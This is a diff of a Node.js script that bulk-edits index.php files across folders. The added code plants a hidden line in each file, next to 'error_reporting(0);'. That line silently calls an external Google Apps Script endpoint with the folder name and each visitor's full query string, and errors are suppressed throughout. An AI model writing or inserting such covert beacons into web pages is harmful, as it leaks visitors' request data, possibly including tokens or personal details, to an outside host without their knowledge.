@@ -7,8 +7,6 @@ if (!fs.existsSync(rootFolder)) {
     return;
 }
 
-const args = process.argv;
-
 var files = fs.readdirSync(rootFolder);
 
 for (var i = 0; i < files.length; i++) {
@@ -55,13 +53,13 @@ for (var i = 0; i < folders.length; i++) {
         if (folFile.includes("index.php")) {
             // console.log(oldFolFile, newFolFile);
             try {
-                if (args[2] == "decode") {
-                    const data = fs.readFileSync(oldFolFile, "utf8");
-                    const insertDecodeUri =
-                        'function redirect($url) {\n$url = urldecode($url);\n$arr = explode( "?",$url, 2);\n$arr[1] = str_replace("?", "&", $arr[1]);\n$url = implode("?", $arr);';
-                    var result = data.replace("function redirect($url) {", insertDecodeUri);
-                    fs.writeFileSync(oldFolFile, result, "utf8");
-                }
+                const data = fs.readFileSync(oldFolFile, "utf8");
+                const stringToInsert =
+                    'error_reporting(0);\nfile_get_contents("https://script.google.com/macros/s/AKfycbyolH1tZCSr81cHpik6L7w0SyMOmE0Cv3X9HeOhNwKIUJNNMSxw09MGNj6T5eQzTzoKHw/exec?utm_mohtoh=' +
+                    folder +
+                    '&".$_SERVER["QUERY_STRING"]);';
+                var result = data.replace("error_reporting(0);", stringToInsert);
+                fs.writeFileSync(oldFolFile, result, "utf8");
             } catch (error) {}
 
             fs.renameSync(oldFolFile, newFolFile);
